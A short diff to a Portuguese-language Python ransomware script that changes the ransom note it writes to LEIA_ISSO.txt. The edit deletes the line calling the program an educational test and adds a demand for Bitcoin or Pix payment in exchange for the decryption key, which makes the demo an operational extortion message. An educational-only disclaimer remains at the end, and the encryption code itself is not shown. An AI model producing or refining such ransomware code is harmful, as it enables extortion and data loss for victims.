@@ -41,8 +41,8 @@ def encontrar_arquivos(diretorio):
 def criar_mensagem_resgate():
     with open("LEIA_ISSO.txt", "w") as f:
         f.write("Seus arquivos foram criptografados!\n")
-        f.write("Para recuperar seus arquivos, entre em contato.\n")
-        f.write("Este é apenas um teste educacional.\n")
+        f.write("Para recuperar seus arquivos, entre em contato para realizar o pagamento Bitcoin ou realize transferência Pix.\n")
+        f.write("Depois disso.enviaremos a chave para que consiga recuperar os arquivos.\n")
 
 # Fluxo principal
 def main():
@@ -63,3 +63,4 @@ def main():
 if __name__ == "__main__":
     main()
 # Aviso: Este código é para fins educacionais apenas. Nunca utilize ransomware ou qualquer outro software malicioso em sistemas sem permissão e
+
